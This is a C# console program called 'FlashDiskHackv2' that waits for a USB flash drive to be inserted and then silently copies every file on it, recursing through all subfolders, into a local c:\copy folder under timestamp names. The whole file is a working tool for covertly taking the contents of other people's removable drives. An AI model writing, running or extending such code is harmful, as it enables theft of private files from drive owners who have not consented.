﻿namespace FlashDiskHackv2
{
    internal class Program
    {
        static void Main(string[] args)
        {


            bool isThereRemovableDriver = false;

            do
            {
                DriveInfo[] allDrivers = DriveInfo.GetDrives();
            
                foreach(DriveInfo driver in allDrivers)
                {
                    if (driver.DriveType == DriveType.Removable)
                    {
                        isThereRemovableDriver = true;


                        string folderPath = @"c:\copy";

                        if (!Directory.Exists(folderPath))
                        {
                            Directory.CreateDirectory(folderPath);
                        }


                        string[] files = Directory.GetFiles($"{driver.Name}");

                        copy(files, folderPath);



                        DirectoryInfo dir = new DirectoryInfo(driver.Name);

                        getsubdir(dir);

                        void getsubdir(DirectoryInfo dir)
                        {
                            DirectoryInfo[] subdir = dir.GetDirectories();

                            if (subdir.Length > 0)
                            {
                              
                                foreach (var directory in subdir)
                                {

                                    Console.WriteLine(directory.FullName);
                                    getsubdir(directory);

                                    string[] files = Directory.GetFiles($"{directory.FullName}");
                                    copy(files, folderPath);

                                }
                            }

                        }


                    }

                }


                Thread.Sleep(2000);
            }
            while (!isThereRemovableDriver); 


        }

        static void  copy(string[] dir , string folderPath)
        {
            for (int i = 0; i < dir.Length; i++)
            {
                string sourceFile = dir[i];
                FileInfo ff = new FileInfo(dir[i]);
                string uzanti = ff.Extension;

                string destinationFile = $@"{folderPath}\{DateTime.Now.Ticks}.{uzanti}";

                try
                {
                    File.Copy(sourceFile, destinationFile, true);
                }
                catch (IOException iox)
                {
                    Console.WriteLine(iox.Message);
                }



            }
        }

    }
}